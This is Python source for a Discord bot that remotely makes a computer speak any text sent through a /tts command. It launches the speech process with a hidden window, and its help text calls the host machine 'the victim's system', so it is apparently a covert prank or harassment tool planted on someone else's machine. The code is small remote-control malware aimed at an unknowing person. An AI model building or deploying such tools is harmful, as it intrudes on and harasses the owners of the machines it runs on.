import discord
from discord import app_commands
from discord.ext import commands
import subprocess
TOKEN = "Token"
tts_process = None
bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())
bot.remove_command('help')

@bot.event
async def on_ready():
    print(f"Running as {bot.user.name}")
    try:
        synced = await bot.tree.sync()
        print(f"synced {len(synced)} command(s)")
    except Exception as e:
        print(e)
    for guild in bot.guilds:
        for channel in guild.text_channels:
            await channel.send(f"Ready to TTS!`")

@bot.tree.command(name="tts", description="Repeat after me!")
@app_commands.describe(text="What do you want me to say?")
async def say(interaction: discord.Interaction, text: str):
    global tts_process
    try:
        if tts_process is not None:
            tts_process.kill()
        await interaction.response.send_message(f"Command Executed!")
        tts_process = subprocess.Popen(
            ["python", "-c", f"import sys; from pyttsx3 import init as tts_init; engine = tts_init(); engine.say({repr(text)}); engine.runAndWait()"],
            creationflags=subprocess.CREATE_NO_WINDOW
        )
    except Exception as e:
        await interaction.response.send_message(f"Error executing command: {str(e)}")
        
@bot.tree.command(name="stoptts", description="Stops TTS")
async def stoptts(interaction: discord.Interaction):
    global tts_process
    if tts_process is not None:
        try:
            await interaction.response.send_message(f"TTS process stopped.")
            tts_process.kill()
            tts_process = None
        except Exception as e:
            await interaction.response.send_message(f"Error stopping TTS process: {str(e)}")
    else:
        await interaction.response.send_message(f"No TTS process running.")

@bot.tree.command(name="help", description="Stops TTS")
async def help(interaction: discord.Interaction):
    help_message = (
        "**Commands List**\n"
        "**tts**: Converts the given text into speech on the victim's system.\n"
        "**help**: Shows this help message."
    )
    await interaction.response.send_message(help_message)

bot.run(TOKEN)
